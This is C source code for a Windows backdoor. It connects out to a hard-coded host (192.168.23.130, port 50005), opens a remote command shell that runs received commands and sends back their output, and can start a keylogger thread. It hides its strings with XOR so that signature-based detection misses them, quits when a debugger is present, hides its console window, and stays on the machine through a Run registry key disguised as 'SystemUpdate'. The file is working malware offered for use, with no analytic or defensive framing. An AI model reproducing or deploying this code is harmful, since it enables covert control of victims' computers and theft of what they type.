#include <winsock2.h> // Include first to avoid winsock2.h warning
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "keylogger.h" // Fixed keylogger.h with logg() function

#pragma comment(lib, "ws2_32.lib") // Link Winsock library

#define XOR_KEY 0x5A // Simple XOR key for encryption

// Encrypted strings (obfuscated to avoid signature-based detection)
char enc_ip[] = {0x31 ^ XOR_KEY, 0x39 ^ XOR_KEY, 0x32 ^ XOR_KEY, 0x2E ^ XOR_KEY,
                 0x31 ^ XOR_KEY, 0x36 ^ XOR_KEY, 0x38 ^ XOR_KEY, 0x2E ^ XOR_KEY,
                 0x32 ^ XOR_KEY, 0x33 ^ XOR_KEY, 0x2E ^ XOR_KEY, 0x31 ^ XOR_KEY,
                 0x33 ^ XOR_KEY, 0x30 ^ XOR_KEY, 0x00}; // "192.168.23.130"
char enc_reg_path[] = {0x48 ^ XOR_KEY, 0x4B ^ XOR_KEY, 0x45 ^ XOR_KEY, 0x59 ^ XOR_KEY,
                       0x5F ^ XOR_KEY, 0x43 ^ XOR_KEY, 0x55 ^ XOR_KEY, 0x52 ^ XOR_KEY,
                       0x52 ^ XOR_KEY, 0x45 ^ XOR_KEY, 0x4E ^ XOR_KEY, 0x54 ^ XOR_KEY,
                       0x5F ^ XOR_KEY, 0x55 ^ XOR_KEY, 0x53 ^ XOR_KEY, 0x45 ^ XOR_KEY,
                       0x52 ^ XOR_KEY, 0x5C ^ XOR_KEY, 0x53 ^ XOR_KEY, 0x6F ^ XOR_KEY,
                       0x66 ^ XOR_KEY, 0x74 ^ XOR_KEY, 0x77 ^ XOR_KEY, 0x61 ^ XOR_KEY,
                       0x72 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x5C ^ XOR_KEY, 0x4D ^ XOR_KEY,
                       0x69 ^ XOR_KEY, 0x63 ^ XOR_KEY, 0x72 ^ XOR_KEY, 0x6F ^ XOR_KEY,
                       0x73 ^ XOR_KEY, 0x6F ^ XOR_KEY, 0x66 ^ XOR_KEY, 0x74 ^ XOR_KEY,
                       0x5C ^ XOR_KEY, 0x57 ^ XOR_KEY, 0x69 ^ XOR_KEY, 0x6E ^ XOR_KEY,
                       0x64 ^ XOR_KEY, 0x6F ^ XOR_KEY, 0x77 ^ XOR_KEY, 0x73 ^ XOR_KEY,
                       0x5C ^ XOR_KEY, 0x43 ^ XOR_KEY, 0x75 ^ XOR_KEY, 0x72 ^ XOR_KEY,
                       0x72 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x6E ^ XOR_KEY, 0x74 ^ XOR_KEY,
                       0x56 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x72 ^ XOR_KEY, 0x73 ^ XOR_KEY,
                       0x69 ^ XOR_KEY, 0x6F ^ XOR_KEY, 0x6E ^ XOR_KEY, 0x5C ^ XOR_KEY,
                       0x52 ^ XOR_KEY, 0x75 ^ XOR_KEY, 0x6E ^ XOR_KEY, 0x00}; // HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
char enc_reg_value[] = {0x53 ^ XOR_KEY, 0x79 ^ XOR_KEY, 0x73 ^ XOR_KEY, 0x74 ^ XOR_KEY,
                        0x65 ^ XOR_KEY, 0x6D ^ XOR_KEY, 0x55 ^ XOR_KEY, 0x70 ^ XOR_KEY,
                        0x64 ^ XOR_KEY, 0x61 ^ XOR_KEY, 0x74 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x00}; // "SystemUpdate"
unsigned short enc_port = 50005 ^ XOR_KEY; // Encrypted port 50005

// Decrypt strings at runtime
void decrypt_string(char* str, int len) {
    for (int i = 0; i < len && str[i] != 0; i++) {
        str[i] ^= XOR_KEY;
    }
}

// Anti-debugging check
int is_debugger_present() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &(BOOL){0});
}

// Persistence via registry
int bootRun() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    char decrypted_reg_path[256];
    strcpy(decrypted_reg_path, enc_reg_path);
    decrypt_string(decrypted_reg_path, strlen(decrypted_reg_path));

    char decrypted_reg_value[32];
    strcpy(decrypted_reg_value, enc_reg_value);
    decrypt_string(decrypted_reg_value, strlen(decrypted_reg_value));

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, decrypted_reg_path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, decrypted_reg_value, 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        return 1;
    }
    return 0;
}

// String slicing utility
char* str_cut(char str[], int slice_from, int slice_to) {
    if (slice_to < 0 || slice_from > slice_to || strlen(str) < slice_to) {
        return NULL;
    }
    char* buffer = malloc(slice_to - slice_from + 1);
    if (!buffer) return NULL;
    strncpy(buffer, str + slice_from, slice_to - slice_from);
    buffer[slice_to - slice_from] = '\0';
    return buffer;
}

// Shell command execution
void Shell(int sock) {
    char buffer[1024];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) break;

        if (strncmp(buffer, "q", 1) == 0) {
            closesocket(sock);
            WSACleanup();
            ExitProcess(0);
        }
        else if (strncmp(buffer, "cd ", 3) == 0) {
            char* dir = str_cut(buffer, 3, strlen(buffer));
            if (dir) {
                SetCurrentDirectoryA(dir);
                free(dir);
            }
        }
        else if (strcmp(buffer, "persist\n") == 0) {
            bootRun();
        }
        else if (strcmp(buffer, "keylog_start\n") == 0) {
            // Start keylogger in a separate thread
            CreateThread(NULL, 0, logg, NULL, 0, NULL);
        }
        else {
            FILE* fp;
            char output[1024];
            fp = _popen(buffer, "r");
            if (fp) {
                while (fgets(output, sizeof(output), fp)) {
                    send(sock, output, strlen(output), 0);
                }
                _pclose(fp);
            }
        }
    }
}

// Main entry point
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    // Avoid detection by checking for debugger
    if (is_debugger_present()) {
        ExitProcess(1);
    }

    // Hide console window for stealth
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Decrypt IP and port
    char ip[16];
    strcpy(ip, enc_ip);
    decrypt_string(ip, strlen(ip));
    unsigned short port = enc_port ^ XOR_KEY;

    // Connect to server
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Add persistence
    bootRun();

    // Start shell
    Shell(sock);

    return 0;
}
